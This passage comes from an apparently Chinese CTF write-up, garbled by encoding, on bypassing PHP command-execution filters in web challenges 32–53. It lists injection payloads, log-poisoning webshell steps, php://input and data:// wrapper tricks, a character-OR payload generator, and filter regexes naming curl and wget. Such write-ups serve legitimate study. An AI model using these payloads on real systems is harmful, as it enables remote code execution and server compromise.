¼ï¼Œå¯ä»¥ä½¿ç”¨%09æ›¿ä»£ï¼›ä¹Ÿå¯ä»¥ä½¿ç”¨{$IFS}ï¼Œå› ä¸ºå•å¼•å·è¢«è¿‡æ»¤äº†ï¼Œæ‰€ä»¥å¦‚æœä½¿ç”¨c&#x3D;passthru(â€œcat%09fla*â€);æˆ–è€…{$IFS}éƒ½ä¸ä¼šè¢«è§£é‡Šä¸ºç©ºæ ¼</p><p>æ‰€ä»¥æ„é€ å¦‚ä¸‹Payload:</p><blockquote><p>1ã€ä½¿ç”¨evalåµŒå¥—ã€‚å…·ä½“å‚æ•°ï¼špassthru ç»“åˆ%09ï¼Œä¹Ÿå¯ä»¥ç›´æ¥rceï¼Œå› ä¸ºæ²¡æœ‰å¯¹å…¶ä»–å‚æ•°è¿›è¡Œè¿‡æ»¤<br>å…¶ä¸­%09ç»•è¿‡ç©ºæ ¼ ?c&#x3D;eval($_GET[1]);&amp;1&#x3D;passthru(â€œtac%09fla*â€); è¿™é‡Œéœ€è¦æ³¨æ„æ‹¬å·çš„é—­åˆï¼Œ&amp;çš„è¿æ¥ã€‚<br>2ã€ä½¿ç”¨å‚æ•°ï¼špassthruç»“åˆ $IFS$9<br>å…¶ä¸­$IFS$9ç»•è¿‡ç©ºæ ¼ï¼Œæ³¨æ„è½¬ä¹‰$ç¬¦å· ?<br>$9æ˜¯å½“å‰ç³»ç»Ÿshellè¿›ç¨‹çš„ç¬¬ä¹ä¸ªå‚æ•°çš„æŒæœ‰è€…ï¼Œå®ƒå§‹ç»ˆä¸ºç©ºå­—ç¬¦ä¸²ã€‚c&#x3D;eval($_GET[1]);&amp;1&#x3D;passthru(â€œtac$IFS$9fla*â€);<br>3ã€ä½¿ç”¨æœªè¢«è¿‡æ»¤çš„å‘½ä»¤ã€‚passthruç›´æ¥è¯»å–<br>?c&#x3D;passthru(%22tac$IFS$9fla*%22); ä¹Ÿå°±æ˜¯passthru(â€œtac$IFS$9fla*â€);<br>4ã€ä½¿ç”¨pos(localeconv)æ¥è·å–å°æ•°ç‚¹<br>localeconvå¯ä»¥è¿”å›åŒ…æ‹¬å°æ•°ç‚¹åœ¨å†…çš„ä¸€ä¸ªæ•°ç»„ï¼›poså»å–å‡ºæ•°ç»„ä¸­å½“å‰ç¬¬ä¸€ä¸ªå…ƒç´ ï¼Œä¹Ÿå°±æ˜¯å°æ•°ç‚¹ã€‚ scandirå¯ä»¥ç»“åˆå®ƒæ‰«æå½“å‰ç›®å½•å†…å®¹ã€‚ ?c&#x3D;print_r(scandir(pos(localeconv()))); å¯ä»¥çœ‹åˆ°å½“å‰ç›®å½•ä¸‹æœ‰flag.php é€šè¿‡array_reverseæŠŠæ•°ç»„é€†åºï¼Œé€šè¿‡nextå–åˆ°ç¬¬äºŒä¸ªæ•°ç»„å…ƒç´ ï¼Œä¹Ÿå³flag.php ç„¶å?c&#x3D;show_source(next(array_reverse(scandir(pos(localeconv())))));</p></blockquote><h4 id="web32-nginxæ—¥å¿—æ³¨å…¥"><a href="#web32-nginxæ—¥å¿—æ³¨å…¥" class="headerlink" title="web32(nginxæ—¥å¿—æ³¨å…¥)"></a>web32(nginxæ—¥å¿—æ³¨å…¥)</h4><p>è¿‡æ»¤æ‰äº†flag|system|php|cat|sort|shell|.| |â€™|&#96;|echo|;|( åŒ…æ‹¬ç‚¹ï¼Œå•å¼•å·ï¼Œåå¼•å·ï¼Œåˆ†å·ï¼Œæ‹¬å·</p><p>æ‰€ä»¥è¿™é‡Œéœ€è¦ä½¿ç”¨includeæ¥æ„é€ Payload:</p><blockquote><p>1ã€?c&#x3D;include$_GET[1]?&gt;&amp;1&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php<br>å…¶ä¸­?&gt;ä»£æ›¿åˆ†å·ï¼Œé¡µé¢ä¼šæ˜¾ç¤ºflag.phpå†…å®¹çš„base64ç¼–ç ï¼Œè§£ç å³å¯è·å–flag<br>è¿˜æœ‰ä¸€ç§æ–¹æ³•ï¼Œæ—¥å¿—æ³¨å…¥<br>2ã€?c&#x3D;include$_GET[1]?%3E&amp;1&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log<br>&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.logæ˜¯nginxé»˜è®¤çš„accessæ—¥å¿—è·¯å¾„ï¼Œè®¿é—®è¯¥è·¯å¾„æ—¶ï¼Œåœ¨User-Agentä¸­å†™å…¥ä¸€å¥è¯æœ¨é©¬ï¼Œç„¶åç”¨ä¸­å›½èšå‰‘è¿æ¥å³å¯</p><p>3ã€?c&#x3D;include$_GET[1]?&gt;&amp;1&#x3D;php:&#x2F;&#x2F;input</p><p>ä¹Ÿå¯ä»¥ä½¿ç”¨php:&#x2F;&#x2F;inputç„¶åä½¿ç”¨postæ‰§è¡Œå‘½ä»¤<?php system("cat flag.php")?></p></blockquote><h4 id="web33"><a href="#web33" class="headerlink" title="web33"></a>web33</h4><p>ç›¸æ¯”ä¸Šä¸€å…³åªå¤šè¿‡æ»¤äº†â€œ</p><p>æ‰€ä»¥web32Payloadä¾æ—§é€‚ç”¨</p><h4 id="web34"><a href="#web34" class="headerlink" title="web34"></a>web34</h4><p>å¤šè¿‡æ»¤ä¸€ä¸ª:  ä¹‹å‰payloadä¾æ—§é€‚ç”¨</p><h4 id="web35"><a href="#web35" class="headerlink" title="web35"></a>web35</h4><p>å¤šè¿‡æ»¤ä¸€ä¸ª&#x3D; &lt;   ä¹‹å‰payloadä¾æ—§é€‚ç”¨</p><h4 id="web36"><a href="#web36" class="headerlink" title="web36"></a>web36</h4><p>å¤šè¿‡æ»¤äº†æ•°å­—  GETå‚æ•°æ”¹ä¸ºaå³å¯</p><h4 id="web37"><a href="#web37" class="headerlink" title="web37"></a>web37</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg <span class="keyword">match</span>(<span class="string">&quot;/flag/i&quot;</span>ï¼Œ<span class="variable">$c</span>))&#123;</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$c</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>1ã€ä½¿ç”¨php:&#x2F;&#x2F;input POSTå†™å…¥phpä»£ç </p><?php system("cat fla*")?><p>2ã€ä½¿ç”¨dataåè®®</p><p>c&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgCnN5c3RlbSgidGFjIGZsYWcucGhwIikKPz4&#x3D;</p><?php system("tac flag.php")?></blockquote><h4 id="web38"><a href="#web38" class="headerlink" title="web38"></a>web38</h4><p>web37Payloadç…§æ ·æ‰“</p><h4 id="web39"><a href="#web39" class="headerlink" title="web39"></a>web39</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$c</span>.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">    &#125; </span><br></pre></td></tr></table></figure><p>?c&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,<?php%20system("tac fla*.php");?><br>?&gt;ä¸ºphpç»“æŸç¬¦å·ï¼Œåé¢æ‹¼æ¥çš„.phpä¼šè¢«å¿½ç•¥æ‰ï¼Œä¸ç”¨ç®¡</p><h4 id="web40-æ•°ç»„å‡½æ•°"><a href="#web40-æ•°ç»„å‡½æ•°" class="headerlink" title="web40(æ•°ç»„å‡½æ•°)"></a>web40(æ•°ç»„å‡½æ•°)</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\ï¼ˆ|\ï¼‰|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br></pre></td></tr></table></figure><p>è¿™æ¬¡æ·»åŠ äº†å¾ˆå¤šè¿‡æ»¤ï¼Œä¹‹å‰æ–¹æ³•å¤§å¤šéƒ½ä¸è¡Œäº†</p><blockquote><p>1ã€c&#x3D;show_source(next(array_reverse(scandir(pos(localeconv()))))); æˆ–è€… c&#x3D;show_source(next(array_reverse(scandir(getcwd()))));</p><p>getcwd() å‡½æ•°è¿”å›å½“å‰å·¥ä½œç›®å½•ã€‚å®ƒå¯ä»¥ä»£æ›¿pos(localeconv())</p><p>localeconv()ï¼šè¿”å›åŒ…å«æœ¬åœ°åŒ–æ•°å­—å’Œè´§å¸æ ¼å¼ä¿¡æ¯çš„å…³è”æ•°ç»„ã€‚è¿™é‡Œä¸»è¦æ˜¯è¿”å›å€¼ä¸ºæ•°ç»„ä¸”ç¬¬ä¸€é¡¹ä¸ºâ€.â€</p><p>pos():è¾“å‡ºæ•°ç»„ç¬¬ä¸€ä¸ªå…ƒç´ ï¼Œä¸æ”¹å˜æŒ‡é’ˆï¼›</p><p>current() å‡½æ•°è¿”å›æ•°ç»„ä¸­çš„å½“å‰å…ƒç´ ï¼ˆå•å…ƒï¼‰,é»˜è®¤å–ç¬¬ä¸€ä¸ªå€¼ï¼Œå’Œpos()ä¸€æ ·</p><p>scandir() å‡½æ•°è¿”å›æŒ‡å®šç›®å½•ä¸­çš„æ–‡ä»¶å’Œç›®å½•çš„æ•°ç»„ã€‚è¿™é‡Œå› ä¸ºå‚æ•°ä¸ºâ€.â€æ‰€ä»¥éå†å½“å‰ç›®å½•</p><p>array_reverse():æ•°ç»„é€†ç½®</p><p>next():å°†æ•°ç»„æŒ‡é’ˆæŒ‡å‘ä¸‹ä¸€ä¸ªï¼Œè¿™é‡Œå…¶å®å¯ä»¥çœç•¥å€’ç½®å’Œæ”¹å˜æ•°ç»„æŒ‡é’ˆï¼Œç›´æ¥åˆ©ç”¨[2]å–å‡ºæ•°ç»„ä¹Ÿå¯ä»¥</p><p>show_source():æŸ¥çœ‹æºç </p><p>pos() å‡½æ•°è¿”å›æ•°ç»„ä¸­çš„å½“å‰å…ƒç´ çš„å€¼ã€‚è¯¥å‡½æ•°æ˜¯current()å‡½æ•°çš„åˆ«åã€‚</p><p>æ¯ä¸ªæ•°ç»„ä¸­éƒ½æœ‰ä¸€ä¸ªå†…éƒ¨çš„æŒ‡é’ˆæŒ‡å‘å®ƒçš„â€å½“å‰â€å…ƒç´ ï¼Œåˆå§‹æŒ‡å‘æ’å…¥åˆ°æ•°ç»„ä¸­çš„ç¬¬ä¸€ä¸ªå…ƒç´ ã€‚</p><p>æç¤ºï¼šè¯¥å‡½æ•°ä¸ä¼šç§»åŠ¨æ•°ç»„å†…éƒ¨æŒ‡é’ˆã€‚</p><p>ç›¸å…³çš„æ–¹æ³•ï¼š</p><p>current()è¿”å›æ•°ç»„ä¸­çš„å½“å‰å…ƒç´ çš„å€¼ã€‚</p><p>end()å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„æœ€åä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚</p><p>next()å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ä¸‹ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚</p><p>prev()å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ä¸Šä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚</p><p>reset()å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ç¬¬ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚</p><p>each()è¿”å›å½“å‰å…ƒç´ çš„é”®åå’Œé”®å€¼ï¼Œå¹¶å°†å†…éƒ¨æŒ‡é’ˆå‘å‰ç§»åŠ¨ã€‚</p><p>2ã€c&#x3D;eval(array_pop(next(get_defined_vars())));&#x2F;&#x2F;éœ€è¦POSTä¼ å…¥å‚æ•°ä¸º1&#x3D;system(â€˜tac fl*â€™);</p><p>åŒç†?cmd&#x3D;system(â€œtac%20flag.phpâ€);&amp;c&#x3D;eval(pos(pos(get_defined_vars())));</p><p>get_defined_vars() è¿”å›ä¸€ä¸ªåŒ…å«æ‰€æœ‰å·²å®šä¹‰å˜é‡çš„å¤šç»´æ•°ç»„ã€‚è¿™äº›å˜é‡åŒ…æ‹¬ç¯å¢ƒå˜é‡ã€æœåŠ¡å™¨å˜é‡å’Œç”¨æˆ·å®šä¹‰çš„å˜é‡ï¼Œä¾‹å¦‚GETã€POSTã€FILEç­‰ç­‰ã€‚</p><p>next()å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ä¸‹ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚</p><p>array_pop() å‡½æ•°åˆ é™¤æ•°ç»„ä¸­çš„æœ€åä¸€ä¸ªå…ƒç´ å¹¶è¿”å›å…¶å€¼ã€‚</p><p>3ã€c&#x3D;session_start();system(session_id());<br>      passid&#x3D;ls</p><p><img src="web40.png" alt="web40" loading="lazy"></p><p>é€šè¿‡cookieè·å¾—å‚æ•°è¿›è¡Œå‘½ä»¤æ‰§è¡Œ</p><p>å—phpç‰ˆæœ¬å½±å“ 5.5 -7.1.9å‡å¯ä»¥æ‰§è¡Œï¼Œå› ä¸ºsession_idè§„å®šä¸º0-9ï¼Œa-z,A-Z,-ä¸­çš„å­—ç¬¦ã€‚åœ¨5.5ä»¥ä¸‹åŠ7.1ä»¥ä¸Šå‡æ— æ³•å†™å…¥é™¤æ­¤ä¹‹å¤–çš„å†…å®¹ã€‚ä½†æ˜¯ç¬¦åˆè¦æ±‚çš„å­—ç¬¦è¿˜æ˜¯å¯ä»¥çš„ã€‚</p></blockquote><h4 id="web41-rce-or"><a href="#web41-rce-or" class="headerlink" title="web41(rce_or)"></a>web41(rce_or)</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#x27;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&quot;echo(<span class="subst">$c</span>);&quot;</span>);</span><br><span class="line">    &#125; </span><br></pre></td></tr></table></figure><p>è¿‡æ»¤äº†<code>$ã€+ã€-ã€^ã€~</code>ä½¿å¾—<strong>å¼‚æˆ–è‡ªå¢å’Œå–å</strong>æ„é€ å­—ç¬¦éƒ½æ— æ³•ä½¿ç”¨ï¼ŒåŒæ—¶è¿‡æ»¤äº†å­—æ¯å’Œæ•°å­—ã€‚ä½†æ˜¯ç‰¹æ„ç•™äº†ä¸ª<code>|</code>è¿ç®—ç¬¦</p><p>æ ¹æ®æ­£åˆ™åŒ¹é…ç”Ÿæˆå¯ç”¨å­—ç¬¦çš„é›†åˆrce_or.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$myfile</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;rce_or.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line"><span class="variable">$contents</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">256</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$j</span>=<span class="number">0</span>; <span class="variable">$j</span> &lt;<span class="number">256</span> ; <span class="variable">$j</span>++) &#123; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$i</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line"><span class="variable">$hex_i</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$hex_i</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$j</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line"><span class="variable">$hex_j</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$hex_j</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$preg</span> = <span class="string">&#x27;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_i</span>))||<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_j</span>)))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_i</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_j</span>;</span><br><span class="line"><span class="variable">$c</span>=(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$a</span>)|<span class="title function_ invoke__">urldecode</span>(<span class="variable">$b</span>));</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&gt;=<span class="number">32</span>&amp;<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&lt;=<span class="number">126</span>) &#123;</span><br><span class="line"><span class="variable">$contents</span>=<span class="variable">$contents</span>.<span class="variable">$c</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$a</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$b</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>,<span class="variable">$contents</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$myfile</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ ¹æ®å¯ç”¨çš„å­—ç¬¦ç”ŸæˆPayload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">action</span>(<span class="params">arg</span>):</span><br><span class="line">   s1=<span class="string">&quot;&quot;</span></span><br><span class="line">   s2=<span class="string">&quot;&quot;</span></span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> arg:</span><br><span class="line">       f=<span class="built_in">open</span>(<span class="string">&quot;rce_or.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line">       <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">           t=f.readline()</span><br><span class="line">           <span class="keyword">if</span> t==<span class="string">&quot;&quot;</span>:</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">           <span class="keyword">if</span> t[<span class="number">0</span>]==i:</span><br><span class="line">               <span class="comment">#print(i)</span></span><br><span class="line">               s1+=t[<span class="number">2</span>:<span class="number">5</span>]</span><br><span class="line">               s2+=t[<span class="number">6</span>:<span class="number">9</span>]</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">       f.close()</span><br><span class="line">   output=<span class="string">&quot;(\&quot;&quot;</span>+s1+<span class="string">&quot;\&quot;|\&quot;&quot;</span>+s2+<span class="string">&quot;\&quot;)&quot;</span></span><br><span class="line">   <span class="keyword">return</span>(output)</span><br><span class="line">   </span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">   param=action(<span class="built_in">input</span>(<span class="string">&quot;\n[+] your functionï¼š&quot;</span>) )+action(<span class="built_in">input</span>(<span class="string">&quot;[+] your commandï¼š&quot;</span>))</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&quot;\n[*] result:\n&quot;</span>+param)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="web41.png" loading="lazy"></p><h4 id="web42"><a href="#web42" class="headerlink" title="web42"></a>web42</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>); </span><br></pre></td></tr></table></figure><p>Payload:</p><blockquote><p>?c&#x3D;cat flag.php;  ?c&#x3D;cat flag.php||  ?c&#x3D;cat flag.php%26(&amp;)    c&#x3D;nl flag.php%0a  ?c&#x3D;echo <code>tac fl*</code>||</p><p>ä½¿ç”¨ â€œ ; â€œ â€œ || â€œ â€œ &amp; â€œ â€œ &amp;&amp; â€œ åˆ†éš”</p><p>&#x2F;dev&#x2F;null 2&gt;&amp;1 æ„æ€æ˜¯å°†æ ‡å‡†è¾“å‡ºå’Œæ ‡å‡†é”™è¯¯éƒ½é‡å®šå‘åˆ° &#x2F;dev&#x2F;null å³ä¸å›æ˜¾<br>; åˆ†å·<br>| åªæ‰§è¡Œåé¢é‚£æ¡å‘½ä»¤<br>|| åªæ‰§è¡Œå‰é¢é‚£æ¡å‘½ä»¤<br>&amp; ä¸¤æ¡å‘½ä»¤éƒ½ä¼šæ‰§è¡Œ<br>&amp;&amp; ä¸¤æ¡å‘½ä»¤éƒ½ä¼šæ‰§è¡Œ</p></blockquote><h4 id="web43"><a href="#web43" class="headerlink" title="web43"></a>web43</h4><p>å¤šè¿‡æ»¤äº†cat,\å’Œï¼›ï¼Œä½¿ç”¨å…¶ä»–Payloadå³å¯</p><h4 id="web44"><a href="#web44" class="headerlink" title="web44"></a>web44</h4><p>å¤šè¿‡æ»¤äº†flagï¼Œä½¿ç”¨fla*å³å¯</p><h4 id="web45"><a href="#web45" class="headerlink" title="web45"></a>web45</h4><p>è¿‡æ»¤äº†ç©ºæ ¼ï¼Œä½¿ç”¨$IFSæˆ–è€…%09ç»•è¿‡å³å¯</p><h4 id="web46"><a href="#web46" class="headerlink" title="web46"></a>web46</h4><p>è¿‡æ»¤äº†$å’Œ*ï¼ŒPayloadå¦‚ä¸‹ï¼š</p><blockquote><p>1ã€?c&#x3D;nl&lt;flaâ€™â€™g.php||</p><p>2ã€?c&#x3D;ca\t&lt;fl\ag.php||</p></blockquote><h4 id="web47"><a href="#web47" class="headerlink" title="web47"></a>web47</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail/i&quot;</span>, <span class="variable">$c</span>)</span><br></pre></td></tr></table></figure><p>Payload:</p><blockquote><p>tac%09flâ€™â€™ag.php||</p><p>â€¦â€¦.</p></blockquote><h4 id="web48"><a href="#web48" class="headerlink" title="web48"></a>web48</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`/i&quot;</span>, <span class="variable">$c</span>)</span><br></pre></td></tr></table></figure><p>å¤šè¿‡æ»¤äº†ä¸€äº›å‡½æ•°ï¼Œä¸è¿‡ä¹‹å‰Payloadå¯ä»¥ç»§ç»­æ‰“</p><h4 id="web49"><a href="#web49" class="headerlink" title="web49"></a>web49</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%/i&quot;</span>, <span class="variable">$c</span>)</span><br></pre></td></tr></table></figure><p>è¿‡æ»¤äº†%ï¼Œä½†æ˜¯å¯ä»¥&lt;</p><h4 id="web50"><a href="#web50" class="headerlink" title="web50"></a>web50</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%|\x09|\x26/i&quot;</span>, <span class="variable">$c</span>)</span><br></pre></td></tr></table></figure><p>åŒä¸Š</p><h4 id="web51"><a href="#web51" class="headerlink" title="web51"></a>web51</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26/i&quot;</span>, <span class="variable">$c</span>)</span><br></pre></td></tr></table></figure><p>banäº†tacä½†æ˜¯å¯ä»¥ç”¨nl</p><h4 id="web52"><a href="#web52" class="headerlink" title="web52"></a>web52</h4><p>banäº†&lt;&gt;ï¼Œä½†æ˜¯å¯ä»¥ç”¨$IFS,è€Œä¸”è¿™æ¬¡flagæ”¾åœ¨äº†æ ¹ç›®å½•</p><p>Payload:</p><blockquote><p>?c&#x3D;nl$IFS&#x2F;flâ€™â€™ag||</p></blockquote><h4 id="web53"><a href="#web53" class="headerlink" title="web53"></a>web53</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="variable">$d</span> = <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>.<span class="variable">$d</span>;</span><br><span class="line">    &#125;<span 